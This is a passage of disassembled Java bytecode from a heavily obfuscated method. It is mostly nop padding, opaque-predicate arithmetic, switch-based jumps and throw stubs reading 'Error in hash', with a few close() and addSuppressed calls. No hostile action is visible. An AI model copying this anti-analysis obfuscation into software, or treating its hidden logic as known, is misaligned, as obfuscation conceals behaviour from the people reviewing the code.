    //   2880: nop
    //   2881: nop
    //   2882: athrow
    //   2883: nop
    //   2884: nop
    //   2885: nop
    //   2886: nop
    //   2887: nop
    //   2888: athrow
    //   2889: new java/io/IOException
    //   2892: astore_3
    //   2893: aload_3
    //   2894: ldc 'Error in hash'
    //   2896: invokespecial <init> : (Ljava/lang/String;)V
    //   2899: aload_3
    //   2900: athrow
    //   2901: new java/lang/RuntimeException
    //   2904: astore_3
    //   2905: aload_3
    //   2906: invokespecial <init> : ()V
    //   2909: aload_3
    //   2910: athrow
    //   2911: nop
    //   2912: nop
    //   2913: nop
    //   2914: athrow
    //   2915: nop
    //   2916: nop
    //   2917: nop
    //   2918: nop
    //   2919: nop
    //   2920: athrow
    //   2921: nop
    //   2922: nop
    //   2923: nop
    //   2924: athrow
    //   2925: nop
    //   2926: nop
    //   2927: nop
    //   2928: nop
    //   2929: nop
    //   2930: athrow
    //   2931: aload #12
    //   2933: areturn
    //   2934: nop
    //   2935: nop
    //   2936: nop
    //   2937: nop
    //   2938: nop
    //   2939: nop
    //   2940: nop
    //   2941: nop
    //   2942: nop
    //   2943: nop
    //   2944: nop
    //   2945: nop
    //   2946: nop
    //   2947: nop
    //   2948: nop
    //   2949: nop
    //   2950: nop
    //   2951: nop
    //   2952: nop
    //   2953: nop
    //   2954: nop
    //   2955: athrow
    //   2956: nop
    //   2957: nop
    //   2958: nop
    //   2959: athrow
    //   2960: nop
    //   2961: nop
    //   2962: nop
    //   2963: nop
    //   2964: nop
    //   2965: athrow
    //   2966: new java/lang/RuntimeException
    //   2969: astore_3
    //   2970: aload_3
    //   2971: invokespecial <init> : ()V
    //   2974: aload_3
    //   2975: athrow
    //   2976: nop
    //   2977: nop
    //   2978: nop
    //   2979: athrow
    //   2980: nop
    //   2981: nop
    //   2982: nop
    //   2983: nop
    //   2984: nop
    //   2985: athrow
    //   2986: new java/lang/RuntimeException
    //   2989: astore_3
    //   2990: aload_3
    //   2991: invokespecial <init> : ()V
    //   2994: aload_3
    //   2995: athrow
    //   2996: new java/lang/IllegalAccessException
    //   2999: astore_3
    //   3000: aload_3
    //   3001: ldc 'Error in hash'
    //   3003: invokespecial <init> : (Ljava/lang/String;)V
    //   3006: aload_3
    //   3007: athrow
    //   3008: nop
    //   3009: nop
    //   3010: nop
    //   3011: athrow
    //   3012: nop
    //   3013: nop
    //   3014: nop
    //   3015: nop
    //   3016: nop
    //   3017: athrow
    //   3018: iload #29
    //   3020: bipush #7
    //   3022: bipush #29
    //   3024: ishl
    //   3025: iand
    //   3026: bipush #29
    //   3028: ishr
    //   3029: iload #29
    //   3031: iconst_3
    //   3032: ishl
    //   3033: ior
    //   3034: tableswitch default -> 3052, -417045671 -> 3064
    //   3052: new java/lang/RuntimeException
    //   3055: astore_3
    //   3056: aload_3
    //   3057: ldc 'Error in hash'
    //   3059: invokespecial <init> : (Ljava/lang/String;)V
    //   3062: aload_3
    //   3063: athrow
    //   3064: ldc_w 683105909
    //   3067: iload #29
    //   3069: ixor
    //   3070: istore #29
    //   3072: goto -> 3102
    //   3075: astore #10
    //   3077: aload #10
    //   3079: athrow
    //   3080: nop
    //   3081: nop
    //   3082: nop
    //   3083: nop
    //   3084: nop
    //   3085: nop
    //   3086: nop
    //   3087: nop
    //   3088: nop
    //   3089: nop
    //   3090: nop
    //   3091: nop
    //   3092: nop
    //   3093: nop
    //   3094: nop
    //   3095: nop
    //   3096: nop
    //   3097: nop
    //   3098: nop
    //   3099: nop
    //   3100: nop
    //   3101: athrow
    //   3102: astore #13
    //   3104: iload #29
    //   3106: bipush #31
    //   3108: imul
    //   3109: iconst_4
    //   3110: iushr
    //   3111: iload #29
    //   3113: irem
    //   3114: iload #29
    //   3116: bipush #16
    //   3118: iushr
    //   3119: ixor
    //   3120: ldc_w 123892553
    //   3123: if_icmpne -> 4941
    //   3126: ldc_w 349178574
    //   3129: iload #29
    //   3131: ixor
    //   3132: istore #29
    //   3134: goto -> 4648
    //   3137: aload #9
    //   3139: ifnull -> 4017
    //   3142: iload #29
    //   3144: bipush #31
    //   3146: imul
    //   3147: iconst_4
    //   3148: iushr
    //   3149: iload #29
    //   3151: irem
    //   3152: iload #29
    //   3154: bipush #16
    //   3156: iushr
    //   3157: ixor
    //   3158: ldc_w 238378371
    //   3161: if_icmpne -> 5403
    //   3164: ldc_w 808080126
    //   3167: iload #29
    //   3169: ixor
    //   3170: istore #29
    //   3172: goto -> 3389
    //   3175: aload #10
    //   3177: ifnull -> 4637
    //   3180: iload #29
    //   3182: bipush #31
    //   3184: imul
    //   3185: iconst_4
    //   3186: iushr
    //   3187: iload #29
    //   3189: irem
    //   3190: iload #29
    //   3192: bipush #16
    //   3194: iushr
    //   3195: ixor
    //   3196: ldc_w 136238522
    //   3199: if_icmpne -> 4993
    //   3202: ldc_w 1484395343
    //   3205: iload #29
    //   3207: ixor
    //   3208: istore #29
    //   3210: goto -> 4449
    //   3213: aload #9
    //   3215: invokevirtual close : ()V
    //   3218: iload #29
    //   3220: bipush #31
    //   3222: imul
    //   3223: iconst_4
    //   3224: iushr
    //   3225: iload #29
    //   3227: irem
    //   3228: iload #29
    //   3230: bipush #16
    //   3232: iushr
    //   3233: ixor
    //   3234: ldc_w 96771907
    //   3237: if_icmpne -> 5447
    //   3240: ldc_w 2080317860
    //   3243: iload #29
    //   3245: ixor
    //   3246: istore #29
    //   3248: goto -> 4263
    //   3251: iload #29
    //   3253: bipush #31
    //   3255: imul
    //   3256: iconst_4
    //   3257: iushr
    //   3258: iload #29
    //   3260: irem
    //   3261: iload #29
    //   3263: bipush #16
    //   3265: iushr
    //   3266: ixor
    //   3267: ldc_w 111527608
    //   3270: if_icmpne -> 4879
    //   3273: ldc_w 2067512677
    //   3276: iload #29
    //   3278: ixor
    //   3279: istore #29
    //   3281: goto -> 3577
    //   3284: astore #14
    //   3286: aload #10
    //   3288: aload #14
    //   3290: invokevirtual addSuppressed : (Ljava/lang/Throwable;)V
    //   3293: iload #29
    //   3295: bipush #31
    //   3297: imul
    //   3298: iconst_4
    //   3299: iushr
    //   3300: iload #29
    //   3302: irem
    //   3303: iload #29
    //   3305: bipush #16
    //   3307: iushr
    //   3308: ixor
    //   3309: ldc_w 200038874
    //   3312: if_icmpne -> 5393
    //   3315: ldc_w 167763222
    //   3318: iload #29
    //   3320: ixor
    //   3321: istore #29
    //   3323: goto -> 3828
    //   3326: aload #9
    //   3328: invokevirtual close : ()V
    //   3331: iload #29
    //   3333: bipush #31
    //   3335: imul
    //   3336: iconst_4
    //   3337: iushr
    //   3338: iload #29
    //   3340: irem
    //   3341: iload #29
    //   3343: bipush #16
    //   3345: iushr
    //   3346: ixor
    //   3347: ldc_w 214849156
    //   3350: if_icmpne -> 5299
    //   3353: ldc_w 485276489
    //   3356: iload #29
    //   3358: ixor
    //   3359: istore #29
    //   3361: goto -> 4028
    //   3364: aload #13
    //   3366: athrow
    //   3367: nop
    //   3368: nop
    //   3369: nop
    //   3370: nop
    //   3371: nop
    //   3372: nop
    //   3373: nop
    //   3374: nop
    //   3375: nop
    //   3376: nop
    //   3377: nop
    //   3378: nop
    //   3379: nop
    //   3380: nop
    //   3381: nop
    //   3382: nop
    //   3383: nop
    //   3384: nop
    //   3385: nop
    //   3386: nop
    //   3387: nop
    //   3388: athrow
    //   3389: iload #29
    //   3391: ldc_w 147558998
    //   3394: iload #29
    //   3396: ixor
    //   3397: imul
    //   3398: ldc_w 147558989
    //   3401: iload #29
    //   3403: ixor
    //   3404: iushr
    //   3405: iload #29
    //   3407: irem
    //   3408: iload #29
    //   3410: ldc_w 147559001
    //   3413: iload #29
    //   3415: ixor
    //   3416: iushr
    //   3417: ixor
    //   3418: ldc_w 163705327
    //   3421: iload #29
    //   3423: ixor
    //   3424: if_icmpeq -> 3451
    //   3427: aconst_null
    //   3428: athrow
    //   3429: nop
    //   3430: nop
    //   3431: nop
    //   3432: nop
    //   3433: nop
    //   3434: nop
    //   3435: nop
    //   3436: nop
    //   3437: nop
    //   3438: nop
    //   3439: nop
    //   3440: nop
    //   3441: nop
    //   3442: nop
    //   3443: nop
    //   3444: nop
    //   3445: nop
    //   3446: nop
    //   3447: nop
    //   3448: nop
    //   3449: nop
    //   3450: athrow
    //   3451: new java/io/IOException
    //   3454: dup
    //   3455: invokespecial <init> : ()V
    //   3458: athrow
    //   3459: nop
    //   3460: nop
    //   3461: nop
    //   3462: nop
    //   3463: nop
    //   3464: nop
    //   3465: nop
    //   3466: nop
    //   3467: nop
    //   3468: nop
    //   3469: nop
    //   3470: nop
    //   3471: nop
    //   3472: nop
    //   3473: nop
    //   3474: nop
    //   3475: nop
    //   3476: nop
    //   3477: nop
    //   3478: nop
    //   3479: nop
    //   3480: athrow
    //   3481: iload #29
    //   3483: bipush #7
    //   3485: bipush #29
    //   3487: ishl
    //   3488: iand
    //   3489: bipush #29
    //   3491: ishr
    //   3492: iload #29
    //   3494: iconst_3
    //   3495: ishl
    //   3496: ior
    //   3497: lookupswitch default -> 4847, 739853912 -> 3524, 1180471880 -> 3535
    //   3524: ldc_w 1407843239
    //   3527: iload #29
    //   3529: ixor
    //   3530: istore #29
    //   3532: goto -> 3543
    //   3535: ldc_w 1587626277
    //   3538: iload #29
    //   3540: ixor
    //   3541: istore #29
    //   3543: pop
    //   3544: iload #29
    //   3546: bipush #31
    //   3548: imul
    //   3549: iconst_4
    //   3550: iushr
    //   3551: iload #29
    //   3553: irem
    //   3554: iload #29
    //   3556: bipush #16
    //   3558: iushr
    //   3559: ixor
    //   3560: ldc_w 124694475
    //   3563: if_icmpne -> 4837
    //   3566: ldc_w 11517509
    //   3569: iload #29
    //   3571: ixor
    //   3572: istore #29
    //   3574: goto -> 3175
    //   3577: iload #29
    //   3579: ldc_w 1758053344
    //   3582: iload #29
    //   3584: ixor
    //   3585: imul
    //   3586: ldc_w 1758053371
    //   3589: iload #29
    //   3591: ixor
    //   3592: iushr
    //   3593: iload #29
    //   3595: irem
    //   3596: iload #29
    //   3598: ldc_w 1758053359
    //   3601: iload #29
    //   3603: ixor
    //   3604: iushr
    //   3605: ixor
    //   3606: ldc_w 1674526856
    //   3609: iload #29
    //   3611: ixor
    //   3612: if_icmpeq -> 3639
    //   3615: aconst_null
    //   3616: athrow
    //   3617: nop
    //   3618: nop
    //   3619: nop
    //   3620: nop
    //   3621: nop
    //   3622: nop
    //   3623: nop
    //   3624: nop
    //   3625: nop
    //   3626: nop
    //   3627: nop
    //   3628: nop
    //   3629: nop
    //   3630: nop
    //   3631: nop
    //   3632: nop
    //   3633: nop
    //   3634: nop
    //   3635: nop
    //   3636: nop
    //   3637: nop
    //   3638: athrow
    //   3639: new java/lang/IllegalAccessException
    //   3642: dup
    //   3643: invokespecial <init> : ()V
    //   3646: athrow
    //   3647: nop
    //   3648: nop
    //   3649: nop
    //   3650: nop
    //   3651: nop
    //   3652: nop
    //   3653: nop
    //   3654: nop
    //   3655: nop
    //   3656: nop
    //   3657: nop
    //   3658: nop
    //   3659: nop
    //   3660: nop
    //   3661: nop
    //   3662: nop
    //   3663: nop
    //   3664: nop
    //   3665: nop
    //   3666: nop
    //   3667: nop
    //   3668: athrow
    //   3669: iload #29
    //   3671: bipush #7
    //   3673: bipush #29
    //   3675: ishl
    //   3676: iand
    //   3677: bipush #29
    //   3679: ishr
    //   3680: iload #29
    //   3682: iconst_3
    //   3683: ishl
    //   3684: ior
    //   3685: lookupswitch default -> 4889, 1179525115 -> 3723, 1474934096 -> 3712
    //   3712: ldc_w 671755173
    //   3715: iload #29
    //   3717: ixor
    //   3718: istore #29
    //   3720: goto -> 3731
    //   3723: ldc_w 1245634288
    //   3726: iload #29
    //   3728: ixor
    //   3729: istore #29
    //   3731: pop
    //   3732: iload #29
    //   3734: bipush #31
    //   3736: imul
    //   3737: iconst_4
    //   3738: iushr
    //   3739: iload #29
    //   3741: irem
    //   3742: iload #29
    //   3744: bipush #16
    //   3746: iushr
    //   3747: ixor
    //   3748: ldc_w 62843578
    //   3751: if_icmpne -> 4901
    //   3754: ldc_w 1997317439
    //   3757: iload #29
    //   3759: ixor
    //   3760: istore #29
    //   3762: goto -> 3364
    //   3765: iload #29
    //   3767: bipush #7
    //   3769: bipush #29
    //   3771: ishl
    //   3772: iand
    //   3773: bipush #29
    //   3775: ishr
    //   3776: iload #29
    //   3778: iconst_3
    //   3779: ishl
    //   3780: ior
    //   3781: lookupswitch default -> 5413, -1566666512 -> 3808, -349676479 -> 3817
    //   3808: iconst_0
    //   3809: iload #29
    //   3811: ixor
    //   3812: istore #29
    //   3814: goto -> 3102
    //   3817: ldc_w 691460502
    //   3820: iload #29
    //   3822: ixor
    //   3823: istore #29
    //   3825: goto -> 3102
    //   3828: iload #29
    //   3830: ldc_w 1882975381
    //   3833: iload #29
    //   3835: ixor
    //   3836: imul
    //   3837: ldc_w 1882975374
    //   3840: iload #29
    //   3842: ixor
    //   3843: iushr
    //   3844: iload #29
    //   3846: irem
    //   3847: iload #29
    //   3849: ldc_w 1882975386
    //   3852: iload #29
    //   3854: ixor
    //   3855: iushr
    //   3856: ixor
    //   3857: ldc_w 2035255034
    //   3860: iload #29
    //   3862: ixor
    //   3863: if_icmpeq -> 3890
    //   3866: aconst_null
    //   3867: athrow
    //   3868: nop
    //   3869: nop
    //   3870: nop
    //   3871: nop
    //   3872: nop
    //   3873: nop
    //   3874: nop
    //   3875: nop
    //   3876: nop
    //   3877: nop
    //   3878: nop
    //   3879: nop
    //   3880: nop
    //   3881: nop
    //   3882: nop
    //   3883: nop
    //   3884: nop
    //   3885: nop
    //   3886: nop
    //   3887: nop
    //   3888: nop
    //   3889: athrow
    //   3890: new java/io/IOException
    //   3893: dup
    //   3894: invokespecial <init> : ()V
    //   3897: athrow
    //   3898: nop
    //   3899: nop
    //   3900: nop
    //   3901: nop
    //   3902: nop
    //   3903: nop
    //   3904: nop
    //   3905: nop
    //   3906: nop
    //   3907: nop
    //   3908: nop
    //   3909: nop
    //   3910: nop
    //   3911: nop
    //   3912: nop
    //   3913: nop
    //   3914: nop
    //   3915: nop
    //   3916: nop
    //   3917: nop
    //   3918: nop
    //   3919: athrow
    //   3920: iload #29
    //   3922: bipush #7
    //   3924: bipush #29
    //   3926: ishl
    //   3927: iand
    //   3928: bipush #29
    //   3930: ishr
    //   3931: iload #29
    //   3933: iconst_3
    //   3934: ishl
    //   3935: ior
    //   3936: lookupswitch default -> 4971, -2116066221 -> 3975, -1026870702 -> 3964
    //   3964: ldc_w 1244650177
    //   3967: iload #29
    //   3969: ixor
    //   3970: istore #29
    //   3972: goto -> 3983
    //   3975: ldc_w 1649233921
    //   3978: iload #29
    //   3980: ixor
    //   3981: istore #29
    //   3983: pop
    //   3984: iload #29
    //   3986: bipush #31
    //   3988: imul
    //   3989: iconst_4
    //   3990: iushr
    //   3991: iload #29
    //   3993: irem
    //   3994: iload #29
    //   3996: bipush #16
    //   3998: iushr
    //   3999: ixor
    //   4000: ldc_w 63315771
    //   4003: if_icmpne -> 4983
    //   4006: ldc_w 1200424123
    //   4009: iload #29
    //   4011: ixor
    //   4012: istore #29
    //   4014: goto -> 3364
    //   4017: ldc_w 1830451335
    //   4020: iload #29
    //   4022: ixor
    //   4023: istore #29
    //   4025: goto -> 3364
    //   4028: iload #29
    //   4030: ldc_w 856345445
    //   4033: iload #29
    //   4035: ixor
    //   4036: imul
    //   4037: ldc_w 856345470
    //   4040: iload #29
    //   4042: ixor
    //   4043: iushr
    //   4044: iload #29
    //   4046: irem
    //   4047: iload #29
    //   4049: ldc_w 856345450
    //   4052: iload #29
    //   4054: ixor
    //   4055: iushr
    //   4056: ixor
    //   4057: ldc_w 837685836
    //   4060: iload #29
    //   4062: ixor
    //   4063: if_icmpeq -> 4090
    //   4066: aconst_null
    //   4067: athrow
    //   4068: nop
    //   4069: nop
    //   4070: nop
    //   4071: nop
    //   4072: nop
    //   4073: nop
    //   4074: nop
    //   4075: nop
    //   4076: nop
    //   4077: nop
    //   4078: nop
    //   4079: nop
    //   4080: nop
    //   4081: nop
    //   4082: nop
    //   4083: nop
    //   4084: nop
    //   4085: nop
    //   4086: nop
    //   4087: nop
    //   4088: nop
    //   4089: athrow
    //   4090: new java/io/IOException
    //   4093: dup
    //   4094: invokespecial <init> : ()V
    //   4097: athrow
    //   4098: nop
    //   4099: nop
    //   4100: nop
    //   4101: nop
    //   4102: nop
    //   4103: nop
    //   4104: nop
    //   4105: nop
    //   4106: nop
    //   4107: nop
    //   4108: nop
    //   4109: nop
    //   4110: nop
    //   4111: nop
    //   4112: nop
    //   4113: nop
    //   4114: nop
    //   4115: nop
    //   4116: nop
    //   4117: nop
    //   4118: nop
    //   4119: athrow
    //   4120: iload #29
    //   4122: bipush #7
    //   4124: bipush #29
    //   4126: ishl
    //   4127: iand
    //   4128: bipush #29
    //   4130: ishr
    //   4131: iload #29
    //   4133: iconst_3
    //   4134: ishl
    //   4135: ior
    //   4136: lookupswitch default -> 5023, -1739170863 -> 4175, -1540933957 -> 4164
    //   4164: ldc_w 1457704631
    //   4167: iload #29
    //   4169: ixor
    //   4170: istore #29
    //   4172: goto -> 4183
    //   4175: ldc_w 292348698
    //   4178: iload #29
    //   4180: ixor
    //   4181: istore #29
    //   4183: pop
    //   4184: iload #29
    //   4186: bipush #31
    //   4188: imul
    //   4189: iconst_4
    //   4190: iushr
    //   4191: iload #29
    //   4193: irem
    //   4194: iload #29
    //   4196: bipush #16
    //   4198: iushr
    //   4199: ixor
    //   4200: ldc_w 44420188
    //   4203: if_icmpne -> 5035
    //   4206: ldc_w 2006814800
    //   4209: iload #29
    //   4211: ixor
    //   4212: istore #29
    //   4214: goto -> 3364
    //   4217: iload #29
    //   4219: bipush #7
    //   4221: bipush #29
    //   4223: ishl
    //   4224: iand
    //   4225: bipush #29
    //   4227: ishr
    //   4228: iload #29
    //   4230: iconst_3
    //   4231: ishl
    //   4232: ior
    //   4233: tableswitch default -> 5425, 1923681475 -> 4252
    //   4252: ldc_w 395382788
    //   4255: iload #29
    //   4257: ixor
    //   4258: istore #29
    //   4260: goto -> 3284
    //   4263: iload #29
    //   4265: ldc_w 363462691
    //   4268: iload #29
    //   4270: ixor
    //   4271: imul
    //   4272: ldc_w 363462712
    //   4275: iload #29
    //   4277: ixor
    //   4278: iushr
    //   4279: iload #29
    //   4281: irem
    //   4282: iload #29
    //   4284: ldc_w 363462700
    //   4287: iload #29
    //   4289: ixor
    //   4290: iushr
    //   4291: ixor
    //   4292: ldc_w 475231714
    //   4295: iload #29
    //   4297: ixor
    //   4298: if_icmpeq -> 4325
    //   4301: aconst_null
    //   4302: athrow
    //   4303: nop
    //   4304: nop
    //   4305: nop
    //   4306: nop
    //   4307: nop
    //   4308: nop
    //   4309: nop
    //   4310: nop
    //   4311: nop
    //   4312: nop
    //   4313: nop
    //   4314: nop
    //   4315: nop
    //   4316: nop
    //   4317: nop
    //   4318: nop
    //   4319: nop
    //   4320: nop
    //   4321: nop
    //   4322: nop
    //   4323: nop
    //   4324: athrow
    //   4325: new java/lang/RuntimeException
    //   4328: dup
    //   4329: invokespecial <init> : ()V
    //   4332: athrow
    //   4333: nop
    //   4334: nop
    //   4335: nop
    //   4336: nop
    //   4337: nop
    //   4338: nop
    //   4339: nop
    //   4340: nop
    //   4341: nop
    //   4342: nop
    //   4343: nop
    //   4344: nop
    //   4345: nop
    //   4346: nop
    //   4347: nop
    //   4348: nop
    //   4349: nop
    //   4350: nop
    //   4351: nop
    //   4352: nop
    //   4353: nop
    //   4354: athrow
    //   4355: iload #29
    //   4357: bipush #7
    //   4359: bipush #29
    //   4361: ishl
    //   4362: iand
    //   4363: bipush #29
    //   4365: ishr
    //   4366: iload #29
    //   4368: iconst_3
    //   4369: ishl
    //   4370: ior
    //   4371: lookupswitch default -> 5319, -1387265568 -> 4407, 510629043 -> 4396
    //   4396: ldc_w 1729661990
    //   4399: iload #29
    //   4401: ixor
    //   4402: istore #29
    //   4404: goto -> 4415
    //   4407: ldc_w 293568140
    //   4410: iload #29
    //   4412: ixor
    //   4413: istore #29
    //   4415: pop
    //   4416: iload #29
    //   4418: bipush #31
    //   4420: imul
    //   4421: iconst_4
    //   4422: iushr
    //   4423: iload #29
    //   4425: irem
    //   4426: iload #29
    //   4428: bipush #16
    //   4430: iushr
    //   4431: ixor
    //   4432: ldc_w 76030480
    //   4435: if_icmpne -> 5331
    //   4438: ldc_w 388431914
    //   4441: iload #29
    //   4443: ixor
    //   4444: istore #29
    //   4446: goto -> 3251
    //   4449: iload #29
    //   4451: ldc_w 247430777
    //   4454: iload #29
    //   4456: ixor
    //   4457: imul
    //   4458: ldc_w 247430754
    //   4461: iload #29
    //   4463: ixor
    //   4464: iushr
    //   4465: iload #29
    //   4467: irem
    //   4468: iload #29
    //   4470: ldc_w 247430774
    //   4473: iload #29
    //   4475: ixor
    //   4476: iushr
    //   4477: ixor
    //   4478: ldc_w 36467772
    //   4481: iload #29
    //   4483: ixor
    //   4484: if_icmpeq -> 4511
    //   4487: aconst_null
    //   4488: athrow
    //   4489: nop
    //   4490: nop
    //   4491: nop
    //   4492: nop
    //   4493: nop
    //   4494: nop
    //   4495: nop
    //   4496: nop
    //   4497: nop
    //   4498: nop
    //   4499: nop
    //   4500: nop
    //   4501: nop
    //   4502: nop
    //   4503: nop
    //   4504: nop
    //   4505: nop
    //   4506: nop
    //   4507: nop
    //   4508: nop
    //   4509: nop
    //   4510: athrow
    //   4511: new java/lang/RuntimeException
    //   4514: dup
    //   4515: invokespecial <init> : ()V
    //   4518: athrow
    //   4519: nop
    //   4520: nop
    //   4521: nop
    //   4522: nop
    //   4523: nop
    //   4524: nop
    //   4525: nop
    //   4526: nop
    //   4527: nop
    //   4528: nop
    //   4529: nop
    //   4530: nop
    //   4531: nop
    //   4532: nop
    //   4533: nop
    //   4534: nop
    //   4535: nop
    //   4536: nop
    //   4537: nop
    //   4538: nop
    //   4539: nop
    //   4540: athrow
    //   4541: iload #29
    //   4543: bipush #7
    //   4545: bipush #29
    //   4547: ishl
    //   4548: iand
    //   4549: bipush #29
    //   4551: ishr
    //   4552: iload #29
    //   4554: iconst_3
    //   4555: ishl
    //   4556: ior
    //   4557: lookupswitch default -> 5371, 1466903025 -> 4584, 1979446064 -> 4595
    //   4584: ldc_w 1711954516
    //   4587: iload #29
    //   4589: ixor
    //   4590: istore #29
    //   4592: goto -> 4603
    //   4595: ldc_w 1113112844
    //   4598: iload #29
    //   4600: ixor
    //   4601: istore #29
    //   4603: pop
    //   4604: iload #29
    //   4606: bipush #31
    //   4608: imul
    //   4609: iconst_4
    //   4610: iushr
    //   4611: iload #29
    //   4613: irem
    //   4614: iload #29
    //   4616: bipush #16
    //   4618: iushr
    //   4619: ixor
    //   4620: ldc_w 83971642
    //   4623: if_icmpne -> 5383
    //   4626: ldc_w 582131442
    //   4629: iload #29
    //   4631: ixor
    //   4632: istore #29
    //   4634: goto -> 3213
    //   4637: ldc_w 2032344346
    //   4640: iload #29
    //   4642: ixor
    //   4643: istore #29
    //   4645: goto -> 3326
    //   4648: iload #29
    //   4650: ldc_w 8640719
    //   4653: iload #29
    //   4655: ixor
    //   4656: imul
    //   4657: ldc_w 8640724
    //   4660: iload #29
    //   4662: ixor
    //   4663: iushr
    //   4664: iload #29
    //   4666: irem
    //   4667: iload #29
    //   4669: ldc_w 8640704
    //   4672: iload #29
    //   4674: ixor
    //   4675: iushr
    //   4676: ixor
    //   4677: ldc_w 16270096
    //   4680: iload #29
    //   4682: ixor
    //   4683: if_icmpeq -> 4710
    //   4686: aconst_null
    //   4687: athrow
    //   4688: nop
    //   4689: nop
    //   4690: nop
    //   4691: nop
    //   4692: nop
    //   4693: nop
    //   4694: nop
    //   4695: nop
    //   4696: nop
    //   4697: nop
    //   4698: nop
    //   4699: nop
    //   4700: nop
    //   4701: nop
    //   4702: nop
    //   4703: nop
    //   4704: nop
    //   4705: nop
    //   4706: nop
    //   4707: nop
    //   4708: nop
    //   4709: athrow
    //   4710: new java/io/IOException
    //   4713: dup
    //   4714: invokespecial <init> : ()V
    //   4717: athrow
    //   4718: nop
    //   4719: nop
    //   4720: nop
    //   4721: nop
    //   4722: nop
    //   4723: nop
    //   4724: nop
    //   4725: nop
    //   4726: nop
    //   4727: nop
    //   4728: nop
    //   4729: nop
    //   4730: nop
    //   4731: nop
    //   4732: nop
    //   4733: nop
    //   4734: nop
    //   4735: nop
    //   4736: nop
    //   4737: nop
    //   4738: nop
    //   4739: athrow
    //   4740: iload #29
    //   4742: bipush #7
    //   4744: bipush #29
    //   4746: ishl
    //   4747: iand
    //   4748: bipush #29
    //   4750: ishr
    //   4751: iload #29
    //   4753: iconst_3
    //   4754: ishl
    //   4755: ior
    //   4756: lookupswitch default -> 5457, -368390702 -> 4784, 69125760 -> 4795
    //   4784: ldc_w 1429060151
    //   4787: iload #29
    //   4789: ixor
    //   4790: istore #29
    //   4792: goto -> 4803
    //   4795: ldc_w 149896029
    //   4798: iload #29
    //   4800: ixor
    //   4801: istore #29
    //   4803: pop
    //   4804: iload #29
    //   4806: bipush #31
    //   4808: imul
    //   4809: iconst_4
    //   4810: iushr
    //   4811: iload #29
    //   4813: irem
    //   4814: iload #29
    //   4816: bipush #16
    //   4818: iushr
    //   4819: ixor
    //   4820: ldc_w 5435533
    //   4823: if_icmpne -> 5469
    //   4826: ldc_w 814555962
    //   4829: iload #29
    //   4831: ixor
    //   4832: istore #29
    //   4834: goto -> 3137
    //   4837: new java/lang/RuntimeException
    //   4840: astore_3
    //   4841: aload_3
    //   4842: invokespecial <init> : ()V
    //   4845: aload_3
    //   4846: athrow
    //   4847: new java/io/IOException
    //   4850: astore_3
    //   4851: aload_3
    //   4852: ldc 'Error in hash'
    //   4854: invokespecial <init> : (Ljava/lang/String;)V
    //   4857: aload_3
    //   4858: athrow
    //   4859: nop
    //   4860: nop
    //   4861: nop
    //   4862: athrow
    //   4863: nop
    //   4864: nop
    //   4865: nop
    //   4866: nop
    //   4867: nop
    //   4868: athrow
    //   4869: nop
    //   4870: nop
    //   4871: nop
    //   4872: athrow
    //   4873: nop
    //   4874: nop
    //   4875: nop
    //   4876: nop
    //   4877: nop
    //   4878: athrow
    //   4879: new java/lang/IllegalAccessException
    //   4882: astore_3
    //   4883: aload_3
    //   4884: invokespecial <init> : ()V
    //   4887: aload_3
    //   4888: athrow
    //   4889: new java/io/IOException
    //   4892: astore_3
    //   4893: aload_3
    //   4894: ldc 'Error in hash'
    //   4896: invokespecial <init> : (Ljava/lang/String;)V
    //   4899: aload_3
    //   4900: athrow
    //   4901: new java/io/IOException
    //   4904: astore_3
    //   4905: aload_3
    //   4906: invokespecial <init> : ()V
    //   4909: aload_3
    //   4910: athrow
    //   4911: nop
    //   4912: nop
    //   4913: nop
    //   4914: athrow
    //   4915: nop
    //   4916: nop
    //   4917: nop
    //   4918: nop
    //   4919: nop
    //   4920: athrow
    //   4921: nop
    //   4922: nop
    //   4923: nop
    //   4924: athrow
    //   4925: nop
    //   4926: nop
    //   4927: nop
    //   4928: nop
    //   4929: nop
    //   4930: athrow
    //   4931: nop
    //   4932: nop
    //   4933: nop
    //   4934: athrow
    //   4935: nop
    //   4936: nop
    //   4937: nop
    //   4938: nop
    //   4939: nop
    //   4940: athrow
    //   4941: new java/lang/RuntimeException
    //   4944: astore_3
    //   4945: aload_3
    //   4946: invokespecial <init> : ()V
    //   4949: aload_3
    //   4950: athrow
    //   4951: nop
    //   4952: nop
    //   4953: nop
    //   4954: athrow
    //   4955: nop
    //   4956: nop
    //   4957: nop
    //   4958: nop
    //   4959: nop
    //   4960: athrow
    //   4961: nop
    //   4962: nop
    //   4963: nop
    //   4964: athrow
    //   4965: nop
    //   4966: nop
    //   4967: nop
    //   4968: nop
    //   4969: nop
    //   4970: athrow
    //   4971: new java/io/IOException
    //   4974: astore_3
    //   4975: aload_3
    //   4976: ldc 'Error in hash'
    //   4978: invokespecial <init> : (Ljava/lang/String;)V
    //   4981: aload_3
    //   4982: athrow
    //   4983: new java/lang/RuntimeException
    //   4986: astore_3
    //   4987: aload_3
    //   4988: invokespecial <init> : ()V
    //   4991: aload_3
    //   4992: athrow
    //   4993: new java/lang/IllegalAccessException
    //   4996: astore_3
    //   4997: aload_3
    //   4998: invokespecial <init> : ()V
    //   5001: aload_3
    //   5002: athrow
    //   5003: nop
    //   5004: nop
    //   5005: nop
    //   5006: athrow
    //   5007: nop
    //   5008: nop
    //   5009: nop
    //   5010: nop
    //   5011: nop
    //   5012: athrow
    //   5013: nop
    //   5014: nop
    //   5015: nop
    //   5016: athrow
    //   5017: nop
    //   5018: nop
    //   5019: nop
    //   5020: nop
    //   5021: nop
    //   5022: athrow
    //   5023: new java/lang/RuntimeException
    //   5026: astore_3
    //   5027: aload_3
    //   5028: ldc 'Error in hash'
    //   5030: invokespecial <init> : (Ljava/lang/String;)V
    //   5033: aload_3
    //   5034: athrow
    //   5035: new java/lang/IllegalAccessException
    //   5038: astore_3
    //   5039: aload_3
    //   5040: invokespecial <init> : ()V
    //   5043: aload_3
    //   5044: athrow
    //   5045: iload #29
    //   5047: bipush #7
    //   5049: bipush #29
    //   5051: ishl
    //   5052: iand
    //   5053: bipush #29
    //   5055: ishr
    //   5056: iload #29
    //   5058: iconst_3
    //   5059: ishl
    //   5060: ior
    //   5061: lookupswitch default -> 5232, -1617693488 -> 5177, -1566666512 -> 5188, -1344421502 -> 5210, -1238668982 -> 5244, -955382343 -> 5166, -836662045 -> 5144, -349676479 -> 5199, 1923681475 -> 5221, 2134081945 -> 5155
    //   5144: ldc_w 2015481577
    //   5147: iload #29
    //   5149: ixor
    //   5150: istore #29
    //   5152: goto -> 5252
    //   5155: ldc_w 771985222
    //   5158: iload #29
    //   5160: ixor
    //   5161: istore #29
